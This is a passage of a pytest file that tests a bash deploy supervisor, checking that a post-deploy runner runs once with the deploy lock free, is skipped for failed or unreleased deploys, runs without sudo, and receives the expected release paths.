    support = tmp_path / "support"
    support.mkdir()
    probe_log = tmp_path / "runner.log"
    (support / "post_deploy.py").write_text(
        "import fcntl, sys\n"
        f"lock = open({str(lock)!r})\n"
        "try:\n"
        "    fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)\n"
        "    state = 'free'\n"
        "except BlockingIOError:\n"
        "    state = 'held'\n"
        f"open({str(probe_log)!r}, 'a').write(state + ' ' + ' '.join(sys.argv[1:]) + '\\n')\n"
    )
    flock_py = "import fcntl,sys; fcntl.flock(int(sys.argv[1]), fcntl.LOCK_EX | fcntl.LOCK_NB)"
    shell = f"""
set -euo pipefail
source {shlex.quote(str(DEPLOY))}
# A real flock on the supervisor's FD (the lock lives on the open file description).
flock() {{ [[ "$1" == "-n" ]] && shift; {shlex.quote(sys.executable)} -c {shlex.quote(flock_py)} "$1"; }}
timeout() {{ if [[ "$1" == --signal=* ]]; then shift 3; else shift; fi; "$@"; }}
sudo() {{ return 1; }}
DEPLOY_TARGET_SHA={target}
supervise_deploy_command bash -c 'exit {deploy_rc}' || echo "supervisor rc=$?"
"""
    env = {
        **os.environ,
        "RADON_DIR": str(radon),
        "RADON_CLOUD_DIR": str(CLOUD_ROOT),
        "RADON_DEPLOY_SUPPORT_DIR": str(support),
        "RADON_SYSTEM_PYTHON": sys.executable,
        "RADON_DEPLOY_ENV_FILE": str(tmp_path / "env"),
        "RADON_DEPLOY_LOCK_FILE": str(lock),
        "RADON_DEPLOY_GREEN_MARKER": str(green),
        "RADON_DEPLOY_TRANSITION_JOURNAL": str(tmp_path / "none.json"),
        "RADON_POST_DEPLOY_STATE": str(tmp_path / "state.json"),
        "RADON_POST_DEPLOY_USER": ME,
        "RADON_DEPLOY_STAGE": stage,
        "DEPLOY_TIMEOUT": "30",
        "DEPLOY_KILL_AFTER": "5",
    }
    result = subprocess.run(["bash", "-c", shell], env=env, capture_output=True, text=True, timeout=60)
    lines = probe_log.read_text().splitlines() if probe_log.exists() else []
    return result, lines, target


def test_supervisor_runs_post_deploy_once_with_the_deploy_lock_free(tmp_path):
    result, lines, target = _supervised_deploy(tmp_path)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "supervisor rc" not in result.stdout
    assert len(lines) == 1, result.stdout + result.stderr
    assert lines[0].startswith("free run ")
    assert f"--deploy-sha {target}" in lines[0]


@pytest.mark.parametrize("kwargs", [
    {"deploy_rc": 1},
    {"stage": "1"},
    {"marker": False},
    {"head_matches": False},
], ids=["failed-deploy", "prestage", "no-green-marker", "head-not-target"])
def test_supervisor_skips_post_deploy_without_a_green_release(tmp_path, kwargs):
    result, lines, _ = _supervised_deploy(tmp_path, **kwargs)
    assert lines == [], result.stdout + result.stderr


def test_post_deploy_failure_is_non_fatal_and_runs_as_radon():
    src = DEPLOY.read_text()
    body = _function_body(src, "run_post_deploy")
    assert "return 0" in body
    assert '--expect-user "$POST_DEPLOY_USER"' in body
    assert 'POST_DEPLOY_USER="${RADON_POST_DEPLOY_USER:-radon}"' in src
    assert "sudo" not in body


def test_run_post_deploy_invokes_runner_with_release_paths(tmp_path):
    support = tmp_path / "support"
    support.mkdir()
    argv_log = tmp_path / "argv"
    (support / "post_deploy.py").write_text(
        "import sys\n"
        f"open({str(argv_log)!r}, 'w').write('\\n'.join(sys.argv[1:]))\n"
        "sys.exit(1)\n"
    )
    radon = tmp_path / "radon"
    (radon / ".venv" / "bin").mkdir(parents=True)
    os.symlink(sys.executable, radon / ".venv" / "bin" / "python")
    env = {
        **os.environ,
        "RADON_DIR": str(radon),
        "RADON_CLOUD_DIR": str(CLOUD_ROOT),
        "RADON_DEPLOY_SUPPORT_DIR": str(support),
        "RADON_SYSTEM_PYTHON": sys.executable,
        "RADON_DEPLOY_ENV_FILE": str(tmp_path / "env"),
        "RADON_POST_DEPLOY_STATE": str(tmp_path / "state.json"),
        "RADON_POST_DEPLOY_USER": ME,
    }
    shell = f"source {shlex.quote(str(DEPLOY))}\nDEPLOY_STARTED_EPOCH=1700000000\nrun_post_deploy {SHA}\necho rc=$?\n"
    result = subprocess.run(["bash", "-c", shell], env=env, capture_output=True, text=True, timeout=30)
    assert "rc=0" in result.stdout, result.stdout + result.stderr
    assert "Post-deploy" in result.stdout + result.stderr
    argv = argv_log.read_text().split("\n")
    assert argv[0] == "run"
    pairs = dict(zip(argv[1::2], argv[2::2]))
    assert pairs["--root"] == str(CLOUD_ROOT / "post_deploy")
    assert pairs["--state"] == str(tmp_path / "state.json")
    assert pairs["--deploy-sha"] == SHA
    assert pairs["--radon-dir"] == str(radon)
    assert pairs["--env-file"] == str(tmp_path / "env")
    assert pairs["--python"] == str(radon / ".venv" / "bin" / "python")
    assert pairs["--expect-user"] == ME
    assert pairs["--since-epoch"] == "1700000000"
